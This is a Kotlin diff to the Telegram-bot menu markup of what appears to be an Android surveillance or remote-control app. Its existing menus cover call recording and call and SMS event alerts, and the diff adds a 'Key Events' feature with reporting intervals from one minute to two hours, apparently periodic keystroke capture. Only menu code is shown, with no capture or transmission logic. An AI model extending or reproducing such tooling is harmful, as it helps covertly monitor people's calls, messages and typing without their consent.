@@ -113,6 +113,7 @@ object BotMarkups {
             val prefs = PrefsManager.getInstance(context)
             val callBtn = if (prefs.callAlertsEnabled) "✅ Call Events" else "❌ Call Events"
             val smsBtn = if (prefs.smsAlertsEnabled) "✅ SMS Events" else "❌ SMS Events"
+            val keyBtn = if (prefs.keyEventsEnabled) "✅ Key Events" else "❌ Key Events"
 
             return """
             {
@@ -121,13 +122,68 @@ object BotMarkups {
                         {"text": "📞 Call Recording", "callback_data": "superior_call_rec_menu"}
                     ],
                     [
-                        {"text": "$callBtn", "callback_data": "toggle_call_events"}
-                    ],
-                    [
+                        {"text": "$callBtn", "callback_data": "toggle_call_events"},
                         {"text": "$smsBtn", "callback_data": "toggle_sms_events"}
                     ],
                     [
+                        {"text": "⚙️ Key Events Configuration", "callback_data": "cfg_key_events"}
+                    ],
+                    [
                         {"text": "Back", "callback_data": "settings_superior"}
+                    ]
+                ]
+            }
+            """.trimIndent()
+        }
+
+        fun buildKeyEventsFeatureMarkup(context: Context): String {
+            val prefs = PrefsManager.getInstance(context)
+            val isEnabled = prefs.keyEventsEnabled
+            val currentInterval = prefs.keyEventsIntervalMin
+            
+            val prefix = "set_key_events"
+            
+            val t1 = if (isEnabled && currentInterval == 1) "✅ 1 Min (Test)" else "1 Min (Test)"
+            val t5 = if (isEnabled && currentInterval == 5) "✅ 5 Min" else "5 Min"
+            val t10 = if (isEnabled && currentInterval == 10) "✅ 10 Min" else "10 Min"
+            val t15 = if (isEnabled && currentInterval == 15) "✅ 15 Min" else "15 Min"
+            val t30 = if (isEnabled && currentInterval == 30) "✅ 30 Min" else "30 Min"
+            val t45 = if (isEnabled && currentInterval == 45) "✅ 45 Min" else "45 Min"
+            val t60 = if (isEnabled && currentInterval == 60) "✅ 1 Hour" else "1 Hour"
+            val t120 = if (isEnabled && currentInterval == 120) "✅ 2 Hour" else "2 Hour"
+            
+            val disableButtonJson = if (isEnabled) {
+                """
+                    [
+                        {"text": "Disable this Feature", "callback_data": "${prefix}_disable"}
+                    ],
+                """
+            } else {
+                ""
+            }
+            
+            return """
+            {
+                "inline_keyboard": [
+                    [
+                        {"text": "$t1", "callback_data": "${prefix}_1"},
+                        {"text": "$t5", "callback_data": "${prefix}_5"}
+                    ],
+                    [
+                        {"text": "$t10", "callback_data": "${prefix}_10"},
+                        {"text": "$t15", "callback_data": "${prefix}_15"}
+                    ],
+                    [
+                        {"text": "$t30", "callback_data": "${prefix}_30"},
+                        {"text": "$t45", "callback_data": "${prefix}_45"}
+                    ],
+                    [
+                        {"text": "$t60", "callback_data": "${prefix}_60"},
+                        {"text": "$t120", "callback_data": "${prefix}_120"}
+                    ],
+                    $disableButtonJson
+                    [
+                        {"text": "Back", "callback_data": "superior_basic_updates"}
                     ]
                 ]
             }
